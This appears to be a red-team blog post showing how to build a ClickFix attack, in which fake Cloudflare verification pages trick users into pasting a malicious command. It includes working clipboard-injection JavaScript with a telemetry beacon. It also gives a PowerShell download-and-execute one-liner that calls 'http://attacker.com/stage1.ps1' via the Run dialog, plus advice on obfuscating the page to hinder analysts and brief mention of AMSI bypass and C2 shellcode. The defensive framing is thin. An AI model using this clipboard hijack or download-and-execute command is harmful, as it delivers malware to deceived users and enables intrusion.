---
title: "How attackers abuse Clickfix for intial Access"
date: 2026-07-022
tags: Click Fix,Social Engineering,Payload Delivery, Phishing
description: In this post, we will go through how to set up ClickFix and see how attackers leverage it for delivering payloads.


---
I was doing some security research and wanted to generate some POC for **ClickFix**, its actually one of the most prevalent social engineering tactics that is actively used by APTs for initial access and malware delivery.

I also wanted to add it in my arsenal of social engineering type of assessments when conducting authorized engagements for professional engagements. 
ClickFix is a vulnerability technique first documented by Mdox, and it has since spawned several variants (FileFix being one notable example).Its an simple and effective technique that combines  psychological manipulation and user behaviors by targeting human behavior instead. 

In this post, I will walk through the complete infection chain, demonstrate how attackers chain it to deliver payloads, and show how adversaries use to perform  in-memory execution to evade security solutions like Microsoft Defender.
I will be using Adaptix C2 as my command and control framework, with PowerShell as the delivery mechanism.

**Note:** I won't be focusing extensively on evasion techniques in this post, as I've covered those in detail in previous blog posts.

## What is ClickFix?
ClickFix is a social engineering technique that leverages fake security warnings to trick users into executing attacker-controlled commands.  So essentialy you become the one who is clickickng and executing the malicious links or as an attacker’s accomplice without even realizing it.The attack typically works by:

1. **Creating a sense of urgency** through fake security alerts (mimicking Cloudflare bot verification, Microsoft, or antivirus vendors)
2. **Exploiting trust in legitimate brands** by reproducing their visual styling
3. **Manipulating users into copying and pasting commands** they don't understand
4. **Executing arbitrary code** with the user's privileges

The beauty of this attack from an adversary's perspective is that it doesn't require zero-days or complex exploit chain, it simply needs social engineering and some user interactions.

## Attack Flow
The diagram below illustrate the click fix attack flow,
![](../static/img/Clickfix/Pasted%20image%2020260722130309.png)

## The Infection Chain: Step-by-Step Breakdown
### Step 1: Initial Redirect
The victim lands on a malicious entry point through one of several vectors it could be through;
- **Compromised websites** (legitimate sites with injected malicious scripts, mostly I have used through compromised wordpress plugins)
- **Malicious advertisements/SEO Poisoning** (ads on legitimate platforms redirecting to attack controlled website)
- **Cracked software/keygen pages** (notorious for hosting malware distribution)
- **Phishing links** (sent via email, SMS, or social media or even when conducting professional phishing campaigns)
- **Fake download portals** (impersonating legitimate software distribution sites)

For our demo, I will just demonstrate the landing page,just for reference purposes I found a pretty good website which tracks all websites that are currently affected by clickfix kind attack,[https://clickfix.carsonww.com]([https://clickfix.carsonww.com)

### Step 2: Fake Verification Screen
Once the users are redirected or land to the page, the victim will see a **convincing fake security warning** that mimics legitimate services. Most of the common examples that have been abused include:
- **Fake Cloudflare verification screens** (most common variant, since most website run behind cloudflare, so it's easy to tryst)
- **Windows Defender alerts** (fake system notifications- requires a lot of effort to set the page)
- **Browser security warnings** (faked browser dialogs)
- **Antivirus vendor screens** (Norton, McAfee, Kaspersky, etc.), hard to setup and you require to know victim security solution

Below are sample of fake Cloudflare pages, I have setup in my own local environment
![](../static/img/Clickfix/Pasted%20image%2020260715182707.png)

![](../static/img/Clickfix/Pasted%20image%2020260711232011.png)

### Step 3: Clipboard Abuse
When the victim clicks the verification button on the ClickFix page, they're presented with a fake verification code screen that instructs them to copy it. The JavaScript on the page silently copies a malicious PowerShell command to their clipboard while displaying a fake "verification code" to the user. The user usually does not have an idea the command has pasted. A sample function code of how its copied its as follows that  attempts to copy the supplied text to the user’s clipboard using the modern Clipboard API, with a hidden-textarea fallback if necessary.

```js
/* ---- Clipboard injection (the core ClickFix mechanic) ----
   Primary: navigator.clipboard.writeText (requires secure context — https or http://localhost).
   Fallback: hidden textarea + execCommand('copy'), the classic ClearFake
   "unsecuredCopyToClipboard" pattern that works over plain HTTP. */
function injectClipboard(text){
  if (navigator.clipboard && window.isSecureContext){
    navigator.clipboard.writeText(text).catch(()=>fallbackCopy(text));
  } else {
    fallbackCopy(text);
  }
  if (CONFIG.telemetryUrl){
    try{ navigator.sendBeacon(CONFIG.telemetryUrl, JSON.stringify({event:'clipboard_injected',ts:Date.now()})); }catch(e){}
  }
}
function fallbackCopy(text){
  const ta=document.createElement('textarea');
  ta.value=text; ta.style.position='fixed'; ta.style.opacity='0';
  document.body.appendChild(ta); ta.focus(); ta.select();
  try{ document.execCommand('copy'); }catch(e){}
  document.body.removeChild(ta);
}
```

Alternatively, I saw there are some variants which shows the actual Powershell command in the "verification code" box, for the users to copy.
A sample is as below
![](../static/img/Clickfix/Pasted%20image%2020260722150008.png)

### Step 4: User Execution
So for delivery and execution, it's important to chooses a path with least resistance to maximize success rate.Windows run to powershell to command prompt to task scheduler to the windows search bar is preferred method since command execution will happens with the current user's privileges, which is often sufficient for lateral movement in corporate environments.Unlike PowerShell, which requires more navigation and terminal awareness, or command prompt, which can seem intimidating to average users, the run dialog is something users interact with and not suscpicous.
In a typical workflow, the user opens windows Run using the keyboard shortcut `Win+R`. then they paste the command, which might look something like below
```bash
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage1.ps1')"
``` 
The command executes in powerShell with the current user's privileges. Within seconds, the window closes and the victim sees only a brief flash of activity that they likely dismiss as a normal system process. This entire sequence takes less than ten seconds and leaves minimal trace of anything unusual having happened.
![](../static/img/Clickfix/Pasted%20image%2020260722155911.png)


### Step 5: Payload Download
Once the user executes the command from the Run dialog, a number of chain of events unfolds behind the scene it fetches the payload from an attacker-controlled server, deobfuscates the embedded payload, and executes in memory. Once everything run as it should you will get a reverse connection to your C2 infrastructure.


### JavaScript Obfuscation
Its is also important to obfuscate the JavaScript you are using in the landing page before deployment. It will make it a difficult for an analyst to analyze. However, obfuscation is not a permanent control, it just add a one layer of protection.

For my lab I used testing web-based obfuscates like [obfuscator.io](obfuscator.io) which also has CLI to obfuscate my code.
most of the click fix affected site have obfuscated code.
```bash
javascript-obfuscator input.js --output obfuscated.js --compact true --control-flow-flattening true --dead-code-injection true
```
![](../static/img/Clickfix/Pasted%20image%2020260714215637.png)
### Generating our payload
For this demo I generate shellcode from Adaptix C2, encoded it with HostMyPayload,added AMSI bypass techniques, and generated a powerShell one-liner that can is injected inthe  ClickFix page. You can reference past post for this here [Adaptix C2](https://sploitony.com/blog/weaponizing-rubber-ducky-adaptix-c2-part-2.html)

![](../static/img/Clickfix/Pasted%20image%2020260722164543.png)

## Conclusion
ClickFix represents a sophisticated blend of social engineering and technical payload delivery.From a red team percepective, its a good technique that can be used for initial access and requires minimal infrastructure and technical sophistication. The best defense is awareness, detection, and rapid incident response.

## References
- [https://attack.mitre.org/techniques/T12049](https://attack.mitre.org/techniques/T1204/)
- [https://www.huntress.com/blog/dont-sweat-clickfix-techniques](https://www.huntress.com/blog/dont-sweat-clickfix-techniques)
- [https://clickfix.carsonww.com/](https://clickfix.carsonww.com/)
- [https://github.com/blwhit/ClickFix-FakeCaptcha-Cloudflare](https://github.com/blwhit/ClickFix-FakeCaptcha-Cloudflare)
- [https://mrd0x.com/filefix-clickfix-alternative/](https://mrd0x.com/filefix-clickfix-alternative/)
- [https://github.com/0x204/ClickFix-Turnstile](https://github.com/0x204/ClickFix-Turnstile)